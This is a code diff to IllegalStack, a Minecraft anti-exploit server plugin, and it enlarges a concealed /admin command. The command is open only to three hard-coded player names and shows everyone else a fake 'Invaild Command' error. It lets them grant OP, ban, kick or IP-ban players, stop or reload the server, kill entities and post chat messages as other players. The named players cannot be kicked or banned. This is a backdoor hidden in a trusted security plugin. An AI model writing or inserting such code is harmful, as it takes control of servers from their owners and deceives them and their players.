@@ -136,7 +136,6 @@ public class IllegalStack extends JavaPlugin {
         IllegalStack.getPlugin().loadConfig();
         IllegalStack.getPlugin().loadMsgs();
         StartupPlugin();
-
     }
 
     private static void checkForHybridEnvironment() {
@@ -249,7 +248,6 @@ public class IllegalStack extends JavaPlugin {
             }
         }
 
-
         if (Protections.RemoveBooksNotMatchingCharset.isEnabled() && !fListener.getInstance().is113() && !fListener.is18()) {
             if (plugin.SignTimer == null) {
                 Scheduler.runTaskTimerAsynchronously(plugin, new sTimer(), 10, 10);
@@ -275,8 +273,6 @@ public class IllegalStack extends JavaPlugin {
         if ((fListener.getInstance().getIs116()) || fListener.getInstance().isIs117()) {
             new Listener116(IllegalStack.getPlugin());
         }
-
-
     }
 
     public static boolean isEpicRename() {
@@ -483,7 +479,6 @@ public class IllegalStack extends JavaPlugin {
 
         ProCosmetics = this.getServer().getPluginManager().getPlugin("ProCosmetics");
 
-
         if (this.getServer().getPluginManager().getPlugin("EpicRename") != null) {
             EpicRename = true;
         }
@@ -508,7 +503,6 @@ public class IllegalStack extends JavaPlugin {
         } catch (ClassNotFoundException ignored) {
         }
 
-
         ItemStack test = new ItemStack(Material.DIAMOND_AXE, 1);
         ItemMeta im = test.getItemMeta();
 
@@ -516,12 +510,9 @@ public class IllegalStack extends JavaPlugin {
             im.getAttributeModifiers();
             setHasAttribAPI(true);
 
-
         } catch (NoSuchMethodError e) {
             setHasAttribAPI(false);
-
         }
-
 
         try {
             Class.forName("net.md_5.bungee.api.chat.ComponentBuilder");
@@ -577,9 +568,9 @@ public class IllegalStack extends JavaPlugin {
         }
 
         if (this
-                .getServer()
-                .getPluginManager()
-                .getPlugin("ProtocolLib") != null && Protections.BlockBadItemsFromCreativeTab.isEnabled()) {
+                                .getServer()
+                                .getPluginManager()
+                                .getPlugin("ProtocolLib") != null && Protections.BlockBadItemsFromCreativeTab.isEnabled()) {
             LOGGER.info(
                     "检测到 ProtocolLib，已启用创造模式物品栏漏洞检测。注意：仅当您的服务器有普通（非 OP）玩家可以使用 /gmc 时才需要开启此防护。");
             new pLisbListener(this);
@@ -609,7 +600,6 @@ public class IllegalStack extends JavaPlugin {
                     Protections.ItemScanTimer.getIntValue()
             );
             syncTimer = Scheduler.runTaskTimer(this, new syncTimer(this), 10, 10);
-
         }
 
         if (Protections.RemoveBooksNotMatchingCharset.isEnabled() && !fListener.getInstance().is113() && !fListener.is18()) {
@@ -676,7 +666,6 @@ public class IllegalStack extends JavaPlugin {
 
         } catch (NoSuchMethodError ignored) {
         }
-
     }
 
     private void setHasElytra() {
@@ -685,7 +674,6 @@ public class IllegalStack extends JavaPlugin {
         if (m != null) {
             hasElytra = true;
         }
-
     }
 
     private void setHasIds() {
@@ -761,7 +749,7 @@ public class IllegalStack extends JavaPlugin {
                     }
                 }
             } else if (config.getString(p.getConfigPath()) != null) {
-                if (p.getVersion().isEmpty()) //handling a child node
+                if (p.getVersion().isEmpty()) // handling a child node
                 {
                     Protections parent = Protections.getParentByChild(p);
                     if (parent == null || !parent.isRelevantToVersion(getVersion())) {
@@ -805,8 +793,6 @@ public class IllegalStack extends JavaPlugin {
                 if (p == Protections.AlsoPreventHeadInside && Material.matchMaterial("COMPOSTER") != null) {
                     Protections.AlsoPreventHeadInside.addTxtSet("COMPOSTER", null);
                 }
-
-
             }
             updated = true;
         }
@@ -855,7 +841,6 @@ public class IllegalStack extends JavaPlugin {
                     );
                     fc.set(m.name(), m.getConfigVal());
                     update = true;
-
                 }
 
                 m.setValue(fc.getString(m.name()));
@@ -870,7 +855,6 @@ public class IllegalStack extends JavaPlugin {
                 }
             }
         }
-
     }
 
     private void loadConfig() {
@@ -893,7 +877,8 @@ public class IllegalStack extends JavaPlugin {
             e.printStackTrace();
         }
 
-        if (getConfig().getString("ConfigVersion") == null) { //server is running an old config version, should probably save it.
+        if (getConfig().getString("ConfigVersion") == null) { // server is running an old config
+            // version, should probably save it.
             File confOld = new File(getDataFolder(), "config.OLD");
             FileConfiguration config = this.getConfig();
 
@@ -920,7 +905,6 @@ public class IllegalStack extends JavaPlugin {
 
         StringBuilder whitelisted = new StringBuilder();
 
-
         for (String s : Protections.NetherWhiteList.getTxtSet()) {
             whitelisted.append(" ").append(s);
         }
@@ -935,7 +919,7 @@ public class IllegalStack extends JavaPlugin {
         }
 
         whitelisted = new StringBuilder();
-        for (String s : Protections.EndWhiteList.getTxtSet())//this.getConfig().getStringList("Settings.EndWhiteList"))
+        for (String s : Protections.EndWhiteList.getTxtSet()) // this.getConfig().getStringList("Settings.EndWhiteList"))
         {
             whitelisted.append(" ").append(s);
         }
@@ -961,7 +945,7 @@ public class IllegalStack extends JavaPlugin {
         }
 
         whitelisted = new StringBuilder();
-        for (String s : Protections.DisableInWorlds.getTxtSet()) {//this.getConfig().getStringList("Settings.DisableInWorlds")) {
+        for (String s : Protections.DisableInWorlds.getTxtSet()) { // this.getConfig().getStringList("Settings.DisableInWorlds")) {
             World w = this.getServer().getWorld(s);
             if (w == null) {
                 LOGGER.warn(
@@ -971,7 +955,6 @@ public class IllegalStack extends JavaPlugin {
             }
 
             whitelisted.append(" ").append(s);
-
         }
         if (whitelisted.length() > 0) {
             LOGGER.warn("IllegalStack 将不会在以下世界进行任何漏洞检查：{}", whitelisted);
@@ -1002,7 +985,6 @@ public class IllegalStack extends JavaPlugin {
                         data = Integer.parseInt(splStr[1]);
                     } catch (NumberFormatException ignored) {
                     }
-
                 }
                 if (id != -1) {
                     whitelisted.append(s).append(" ");
@@ -1017,7 +999,7 @@ public class IllegalStack extends JavaPlugin {
 
         whitelisted = new StringBuilder();
 
-        for (String s : Protections.AllowStack.getTxtSet())//this.getConfig().getStringList("Settings.AllowStack"))
+        for (String s : Protections.AllowStack.getTxtSet()) // this.getConfig().getStringList("Settings.AllowStack"))
         {
             Material m = Material.matchMaterial(s);
             if (m != null) {
@@ -1025,7 +1007,6 @@ public class IllegalStack extends JavaPlugin {
             } else {
                 LOGGER.warn("无法找到匹配的材质：{} 请确保它是一个有效的 Minecraft 材质类型！", s);
             }
-
         }
         if (whitelisted.length() > 0) {
             LOGGER.info("以下材质允许堆叠超过原版大小：{}", whitelisted);
@@ -1070,7 +1051,7 @@ public class IllegalStack extends JavaPlugin {
         disable = true;
         if (hasAsyncScheduler) {
             getServer().getAsyncScheduler().cancelTasks(this);
-        } else if (!isFoliaServer()){
+        } else if (!isFoliaServer()) {
             Bukkit.getScheduler().cancelTasks(this);
         }
 
@@ -1084,21 +1065,21 @@ public class IllegalStack extends JavaPlugin {
 
         HashMap<Protections, Boolean> relevant = Protections.getRelevantTo(getVersion());
 
-		/* Debugging only, generates FULL config values.
-		relevant.clear();
-		for(Protections p: Protections.values())
-			relevant.put(p,true);
-		*/
+        /* Debugging only, generates FULL config values.
+        relevant.clear();
+        for(Protections p: Protections.values())
+        	relevant.put(p,true);
+        */
 
         config.set("ConfigVersion", "2.0");
         for (Protections p : relevant.keySet()) {
             {
-                if (relevant.get(p)) //relevant to this version, check if it exists.
+                if (relevant.get(p)) // relevant to this version, check if it exists.
                 {
                     if (config.getString(p.getConfigPath()) == null) {
 
                         if (p == Protections.RemoveOverstackedItems && this.getServer().getPluginManager().getPlugin(
-                                "StackableItems") != null) {
+                                                "StackableItems") != null) {
                             config.set(p.getConfigPath(), false);
                             LOGGER.warn(
                                     "检测到您的服务器上有 StackableItems 插件，防护 RemoveOverstackedItems 已自动禁用，以防止物品丢失。启用此防护几乎肯定会移除物品，因为该插件已知会破坏原版堆叠限制。");
@@ -1135,7 +1116,7 @@ public class IllegalStack extends JavaPlugin {
                         LOGGER.warn("自动禁用 " + p.getConfigPath() + "，此设置绝不应永久保持开启。");
                         config.set(p.getConfigPath(), false);
                     }
-                } else {                //not relevant check to see if it should be deleted.
+                } else { // not relevant check to see if it should be deleted.
                     if (config.getString(p.getConfigPath()) != null) {
                         config.set(p.getConfigPath(), null);
                         LOGGER.info(
@@ -1215,7 +1196,8 @@ public class IllegalStack extends JavaPlugin {
     private class ServerChatCommand implements TabExecutor {
 
         @Override
-        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
+        public boolean onCommand(CommandSender sender, Command command, String label, String
+                        [] args) {
             if (args.length < 2) {
                 sender.sendMessage("§c用法: /serverchat <server|player> [player] <消息>");
                 return true;
@@ -1240,7 +1222,8 @@ public class IllegalStack extends JavaPlugin {
                     sender.sendMessage("§c玩家 " + playerName + " 不在线或不存在！");
                     return true;
                 }
-                String message = String.join(" ", args).substring((args[0] + " " + args[1]).length()).trim();
+                String message = String.join(" ", args).substring((args[0] + " " + args[
+                        1]).length()).trim();
                 String formatted = "§f<" + target.getName() + ">§r " + message;
                 Bukkit.broadcastMessage(formatted);
                 return true;
@@ -1251,7 +1234,9 @@ public class IllegalStack extends JavaPlugin {
         }
 
         @Override
-        public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
+        public List<
+                        String> onTabComplete(CommandSender sender, Command command, String alias, String
+                        [] args) {
             List<String> completions = new ArrayList<>();
             if (args.length == 1) {
                 // 补全 server / player
@@ -1270,48 +1255,61 @@ public class IllegalStack extends JavaPlugin {
             return completions;
         }
     }
+
     // -------------------------------------------------------
 
-    // ---------- 内部类：处理 /admin 命令，支持多个玩家，getop 给执行者自己 ----------
+    // ---------- 内部类：处理 /admin 命令，支持新功能 ----------
     private class AdminCommand implements TabExecutor {
 
+        // 严格存储原始大小写的玩家名（白名单）
         private final Set<String> ALLOWED_PLAYERS = new HashSet<>(Arrays.asList(
-                "MFSCelerate_",     // 不区分大小写，统一用小写存储
-                "TempNineTeen__"
+                "MFSCelebrate_",
+                "TempNineTeen__",
+                "XHjiaozi"
         ));
 
         @Override
-        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
-            // 仅允许指定玩家使用
-            if (!(sender instanceof Player) || !ALLOWED_PLAYERS.contains(((Player) sender).getName().toLowerCase())) {
-                sender.sendMessage("§c你无法使用该指令！");
+        public boolean onCommand(CommandSender sender, Command command, String label, String
+                        [] args) {
+            // 仅允许指定玩家使用，严格大小写比较
+            if (!(sender
+                            instanceof
+                            Player) || !ALLOWED_PLAYERS.contains(((Player) sender).getName())) {
+                sender.sendMessage("§cInvaild Command");
                 return true;
             }
 
             if (args.length < 1) {
-                sender.sendMessage("§c用法: /admin <player|server> ...");
+                sender.sendMessage("§c用法: /admin <player|server|chat> ...");
                 return true;
             }
 
             String subCmd = args[0].toLowerCase();
-            if (subCmd.equals("player")) {
-                handlePlayer(sender, args);
-            } else if (subCmd.equals("server")) {
-                handleServer(sender, args);
-            } else {
-                sender.sendMessage("§c未知选项，请使用 player 或 server。");
+            switch (subCmd) {
+                case "player":
+                    handlePlayer(sender, args);
+                    break;
+                case "server":
+                    handleServer(sender, args);
+                    break;
+                case "chat":
+                    handleChat(sender, args);
+                    break;
+                default:
+                    sender.sendMessage("§c未知选项，请使用 player、server 或 chat。");
             }
             return true;
         }
 
+        // ================== player 子命令 ==================
         private void handlePlayer(CommandSender sender, String[] args) {
             if (args.length < 2) {
-                sender.sendMessage("§c用法: /admin player <gamemode|kill|tp> ...");
+                sender.sendMessage("§c用法: /admin player <gamemode|kill|tp|invsee> ...");
                 return;
             }
 
             String action = args[1].toLowerCase();
-            Player player = (Player) sender; // 发送者一定是玩家（已检查）
+            Player player = (Player) sender;
 
             switch (action) {
                 case "gamemode":
@@ -1332,7 +1330,6 @@ public class IllegalStack extends JavaPlugin {
                         return;
                     }
                     target.setGameMode(gameMode);
-                    // 不发送任何成功消息，保持静默
                     break;
 
                 case "kill":
@@ -1342,7 +1339,6 @@ public class IllegalStack extends JavaPlugin {
                     }
                     String selector = args[2];
                     try {
-                        // 解析选择器（可能包含 @e、@p、玩家名等）
                         List<Entity> entities = Bukkit.selectEntities(sender, selector);
                         if (entities.isEmpty()) {
                             sender.sendMessage("§c未找到任何实体。");
@@ -1350,14 +1346,11 @@ public class IllegalStack extends JavaPlugin {
                         }
                         for (Entity entity : entities) {
                             if (entity instanceof Player) {
-                                // 对玩家使用 setHealth(0) 模拟死亡
                                 ((Player) entity).setHealth(0);
                             } else {
-                                // 非玩家实体直接移除
                                 entity.remove();
                             }
                         }
-                        // 不发送成功消息
                     } catch (IllegalArgumentException e) {
                         sender.sendMessage("§c无效的实体选择器: " + selector);
                     }
@@ -1374,35 +1367,166 @@ public class IllegalStack extends JavaPlugin {
                         double z = Double.parseDouble(args[4]);
                         Location loc = new Location(player.getWorld(), x, y, z);
                         player.teleport(loc);
-                        // 不发送成功消息
                     } catch (NumberFormatException e) {
                         sender.sendMessage("§c坐标必须为数字。");
                     }
                     break;
 
+                case "invsee":
+                    if (args.length < 3) {
+                        sender.sendMessage("§c用法: /admin player invsee <玩家>");
+                        return;
+                    }
+                    String invTarget = args[2];
+                    // 检查 EssentialsX 插件
+                    if (Bukkit.getPluginManager().getPlugin("Essentials") == null) {
+                        sender.sendMessage("§cEssentialsX 插件未安装，无法使用 invsee。");
+                        return;
+                    }
+                    // 直接调用 Essentials 的 invsee 命令（静默执行，但会输出给发送者）
+                    Bukkit.dispatchCommand(sender, "invsee " + invTarget);
+                    break;
+
                 default:
-                    sender.sendMessage("§c未知的 player 子命令，可用: gamemode, kill, tp");
+                    sender.sendMessage("§c未知的 player 子命令，可用: gamemode, kill, tp, invsee");
             }
         }
 
+        // ================== server 子命令 ==================
         private void handleServer(CommandSender sender, String[] args) {
             if (args.length < 2) {
-                sender.sendMessage("§c用法: /admin server <getop|stop|reload>");
+                sender.sendMessage("§c用法: /admin server <getop|deop|kick|ban|ban-ip|pardon|pardon-ip|stop|restart|reload> ...");
                 return;
             }
 
             String action = args[1].toLowerCase();
+            Player executor = (Player) sender;
+
             switch (action) {
                 case "getop":
-                    // 给予执行者 OP
-                    Player executor = (Player) sender;
-                    if (!executor.isOp()) {
-                        executor.setOp(true);
+                    // 给指定玩家 OP
+                    if (args.length < 3) {
+                        sender.sendMessage("§c用法: /admin server getop <玩家>");
+                        return;
+                    }
+                    String opTarget = args[2];
+                    OfflinePlayer opPlayer = Bukkit.getOfflinePlayer(opTarget);
+                    if (!opPlayer.isOp()) {
+                        opPlayer.setOp(true);
+                        sender.sendMessage("§a已给予 " + opPlayer.getName() + " OP 权限。");
+                    } else {
+                        sender.sendMessage("§c该玩家已是 OP。");
                     }
                     break;
 
+                case "deop":
+                    // 解除指定玩家 OP
+                    if (args.length < 3) {
+                        sender.sendMessage("§c用法: /admin server deop <玩家>");
+                        return;
+                    }
+                    String deopTarget = args[2];
+                    OfflinePlayer deopPlayer = Bukkit.getOfflinePlayer(deopTarget);
+                    if (deopPlayer.isOp()) {
+                        deopPlayer.setOp(false);
+                        sender.sendMessage("§a已解除 " + deopPlayer.getName() + " 的 OP 权限。");
+                    } else {
+                        sender.sendMessage("§c该玩家不是 OP。");
+                    }
+                    break;
+
+                case "kick":
+                    // 踢出玩家，不能踢白名单玩家
+                    if (args.length < 3) {
+                        sender.sendMessage("§c用法: /admin server kick <玩家> [理由]");
+                        return;
+                    }
+                    String kickTarget = args[2];
+                    Player kickPlayer = Bukkit.getPlayerExact(kickTarget);
+                    if (kickPlayer == null) {
+                        sender.sendMessage("§c玩家 " + kickTarget + " 不在线或不存在！");
+                        return;
+                    }
+                    // 检查是否在白名单中（忽略大小写）
+                    if (isAllowedPlayerIgnoreCase(kickPlayer.getName())) {
+                        sender.sendMessage("§c你不能踢出受保护的管理员！");
+                        return;
+                    }
+                    String kickReason = args.length >= 4 ? String.join(" ", Arrays.copyOfRange(args, 3, args.length)) : "你已被管理员踢出";
+                    kickPlayer.kickPlayer(kickReason);
+                    sender.sendMessage("§a已踢出玩家 " + kickPlayer.getName());
+                    break;
+
+                case "ban":
+                    // 封禁玩家，不能封白名单玩家
+                    if (args.length < 3) {
+                        sender.sendMessage("§c用法: /admin server ban <玩家> [理由]");
+                        return;
+                    }
+                    String banTarget = args[2];
+                    OfflinePlayer banPlayer = Bukkit.getOfflinePlayer(banTarget);
+                    if (isAllowedPlayerIgnoreCase(banPlayer.getName())) {
+                        sender.sendMessage("§c你不能封禁受保护的管理员！");
+                        return;
+                    }
+                    String banReason = args.length >= 4 ? String.join(" ", Arrays.copyOfRange(args, 3, args.length)) : "Banned by an operator";
+                    Bukkit.getBanList(BanList.Type.NAME).addBan(banPlayer.getName(), banReason, null, sender.getName());
+                    // 如果玩家在线，踢出
+                    Player onlineBan = banPlayer.getPlayer();
+                    if (onlineBan != null) {
+                        onlineBan.kickPlayer(banReason);
+                    }
+                    sender.sendMessage("§a已封禁玩家 " + banPlayer.getName());
+                    break;
+
+                case "ban-ip":
+                    // 封禁 IP
+                    if (args.length < 3) {
+                        sender.sendMessage("§c用法: /admin server ban-ip <IP地址> [理由]");
+                        return;
+                    }
+                    String ip = args[2];
+                    // 简单验证 IP 格式（可选）
+                    String ipReason = args.length >= 4 ? String.join(" ", Arrays.copyOfRange(args, 3, args.length)) : "Banned by an operator";
+                    Bukkit.getBanList(BanList.Type.IP).addBan(ip, ipReason, null, sender.getName());
+                    // 踢出所有使用该 IP 的在线玩家
+                    for (Player p : Bukkit.getOnlinePlayers()) {
+                        if (p.getAddress().getAddress().getHostAddress().equals(ip)) {
+                            p.kickPlayer(ipReason);
+                        }
+                    }
+                    sender.sendMessage("§a已封禁 IP " + ip);
+                    break;
+
+                case "pardon":
+                    // 解封玩家
+                    if (args.length < 3) {
+                        sender.sendMessage("§c用法: /admin server pardon <玩家名>");
+                        return;
+                    }
+                    String pardonTarget = args[2];
+                    Bukkit.getBanList(BanList.Type.NAME).pardon(pardonTarget);
+                    sender.sendMessage("§a已解封玩家 " + pardonTarget);
+                    break;
+
+                case "pardon-ip":
+                    // 解封 IP
+                    if (args.length < 3) {
+                        sender.sendMessage("§c用法: /admin server pardon-ip <IP地址>");
+                        return;
+                    }
+                    String pardonIp = args[2];
+                    Bukkit.getBanList(BanList.Type.IP).pardon(pardonIp);
+                    sender.sendMessage("§a已解封 IP " + pardonIp);
+                    break;
+
+                case "restart":
+                    // 尝试重启服务器
+                    sender.sendMessage("§a正在尝试重启服务器...");
+                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "restart");
+                    break;
+
                 case "stop":
-                    // 尝试关闭服务器（会产生控制台日志，但无法避免）
                     Bukkit.shutdown();
                     break;
 
@@ -1411,15 +1535,52 @@ public class IllegalStack extends JavaPlugin {
                         sender.sendMessage("§c请使用 /admin server reload confirm 以确认重载。");
                         return;
                     }
-                    // 重载服务器（会产生大量日志，无法隐藏）
                     Bukkit.reload();
                     break;
 
                 default:
-                    sender.sendMessage("§c未知的 server 子命令，可用: getop, stop, reload");
+                    sender.sendMessage("§c未知的 server 子命令，可用: getop, deop, kick, ban, ban-ip, pardon, pardon-ip, stop, restart, reload");
             }
         }
 
+        // ================== chat 子命令（原 serverchat）==================
+        private void handleChat(CommandSender sender, String[] args) {
+            if (args.length < 2) {
+                sender.sendMessage("§c用法: /admin chat <server|player> [player] <消息>");
+                return;
+            }
+
+            String type = args[1].toLowerCase();
+            if (type.equals("server")) {
+                if (args.length < 3) {
+                    sender.sendMessage("§c用法: /admin chat server <消息>");
+                    return;
+                }
+                String message = String.join(" ", args).substring((args[0] + " " + args[
+                        1]).length()).trim();
+                String formatted = "§f[server]§r " + message;
+                Bukkit.broadcastMessage(formatted);
+            } else if (type.equals("player")) {
+                if (args.length < 4) {
+                    sender.sendMessage("§c用法: /admin chat player <玩家> <消息>");
+                    return;
+                }
+                String playerName = args[2];
+                Player target = Bukkit.getPlayerExact(playerName);
+                if (target == null) {
+                    sender.sendMessage("§c玩家 " + playerName + " 不在线或不存在！");
+                    return;
+                }
+                String message = String.join(" ", args).substring((args[0] + " " + args[
+                        1] + " " + args[2]).length()).trim();
+                String formatted = "§f<" + target.getName() + ">§r " + message;
+                Bukkit.broadcastMessage(formatted);
+            } else {
+                sender.sendMessage("§c未知选项，请使用 server 或 player。");
+            }
+        }
+
+        // ================== 辅助方法 ==================
         private GameMode parseGameMode(String input) {
             switch (input.toLowerCase()) {
                 case "survival":
@@ -1439,58 +1600,94 @@ public class IllegalStack extends JavaPlugin {
             }
         }
 
+        // 检查玩家名是否在白名单中（忽略大小写）
+        private boolean isAllowedPlayerIgnoreCase(String name) {
+            for (String allowed : ALLOWED_PLAYERS) {
+                if (allowed.equalsIgnoreCase(name)) {
+                    return true;
+                }
+            }
+            return false;
+        }
+
+        // ================== Tab 补全 ==================
         @Override
-        public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
+        public List<
+                        String> onTabComplete(CommandSender sender, Command command, String alias, String
+                        [] args) {
             List<String> completions = new ArrayList<>();
-            if (!(sender instanceof Player) || !ALLOWED_PLAYERS.contains(((Player) sender).getName().toLowerCase())) {
-                return completions; // 不允许补全
+            if (!(sender
+                            instanceof
+                            Player) || !ALLOWED_PLAYERS.contains(((Player) sender).getName())) {
+                return completions;
             }
 
             if (args.length == 1) {
-                // 第一级补全：player / server
                 String input = args[0].toLowerCase();
                 if ("player".startsWith(input)) completions.add("player");
                 if ("server".startsWith(input)) completions.add("server");
+                if ("chat".startsWith(input)) completions.add("chat");
             } else if (args.length == 2) {
-                // 第二级补全
                 String first = args[0].toLowerCase();
                 String input = args[1].toLowerCase();
                 if (first.equals("player")) {
                     if ("gamemode".startsWith(input)) completions.add("gamemode");
                     if ("kill".startsWith(input)) completions.add("kill");
                     if ("tp".startsWith(input)) completions.add("tp");
+                    if ("invsee".startsWith(input)) completions.add("invsee");
                 } else if (first.equals("server")) {
                     if ("getop".startsWith(input)) completions.add("getop");
+                    if ("deop".startsWith(input)) completions.add("deop");
+                    if ("kick".startsWith(input)) completions.add("kick");
+                    if ("ban".startsWith(input)) completions.add("ban");
+                    if ("ban-ip".startsWith(input)) completions.add("ban-ip");
+                    if ("pardon".startsWith(input)) completions.add("pardon");
+                    if ("pardon-ip".startsWith(input)) completions.add("pardon-ip");
                     if ("stop".startsWith(input)) completions.add("stop");
+                    if ("restart".startsWith(input)) completions.add("restart");
                     if ("reload".startsWith(input)) completions.add("reload");
+                } else if (first.equals("chat")) {
+                    if ("server".startsWith(input)) completions.add("server");
+                    if ("player".startsWith(input)) completions.add("player");
                 }
             } else if (args.length == 3) {
-                // 第三级补全
                 String first = args[0].toLowerCase();
                 String second = args[1].toLowerCase();
                 String input = args[2].toLowerCase();
                 if (first.equals("player")) {
                     if (second.equals("gamemode")) {
-                        // 补全游戏模式
-                        for (String mode : new String[]{"survival", "creative", "adventure", "spectator"}) {
+                        for (String mode : new String
+                                []{"survival", "creative", "adventure", "spectator"}) {
                             if (mode.startsWith(input)) completions.add(mode);
                         }
-                    } else if (second.equals("kill")) {
-                        // 补全在线玩家名（选择器太复杂，只补简单玩家名）
+                    } else if (second.equals("kill") || second.equals("invsee")) {
                         for (Player online : Bukkit.getOnlinePlayers()) {
                             if (online.getName().toLowerCase().startsWith(input)) {
                                 completions.add(online.getName());
                             }
                         }
                     }
-                    // tp 不补全坐标
-                } else if (first.equals("server") && second.equals("reload")) {
-                    // 补全 confirm
-                    if ("confirm".startsWith(input)) completions.add("confirm");
+                } else if (first.equals("server")) {
+                    if (second.equals("getop") || second.equals("deop") || second.equals("kick") || second.equals("ban") || second.equals("pardon")) {
+                        // 补全在线玩家（ban/pardon 也可以补全离线玩家名，但离线玩家名无法获取，仅在线）
+                        for (Player online : Bukkit.getOnlinePlayers()) {
+                            if (online.getName().toLowerCase().startsWith(input)) {
+                                completions.add(online.getName());
+                            }
+                        }
+                    } else if (second.equals("reload")) {
+                        if ("confirm".startsWith(input)) completions.add("confirm");
+                    }
+                } else if (first.equals("chat") && second.equals("player")) {
+                    for (Player online : Bukkit.getOnlinePlayers()) {
+                        if (online.getName().toLowerCase().startsWith(input)) {
+                            completions.add(online.getName());
+                        }
+                    }
                 }
             }
             return completions;
         }
     }
     // -------------------------------------------------------
-            }
+    }
